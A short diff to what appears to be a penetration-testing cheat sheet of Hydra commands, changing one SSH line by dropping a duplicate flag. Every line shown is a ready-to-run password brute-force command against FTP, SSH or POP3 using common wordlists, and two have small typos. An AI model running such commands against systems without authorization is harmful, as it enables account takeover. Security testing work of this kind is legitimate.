@@ -14,8 +14,8 @@ hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp 	# Hydra FTP
 
 # Default FTP credentials
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
-
-hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh 		# Hydra SSH using list of users and passwords
+ 
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 $ip ssh 		# Hydra SSH using list of users and passwords
 hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh 			# Hydra SSH using a known password and a username list
 hydra $ip -s 22 ssh -l -P big_wordlist.txt 				# Hydra SSH Against Known username on port 22
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V 	# Hydra POP3 Brute Force
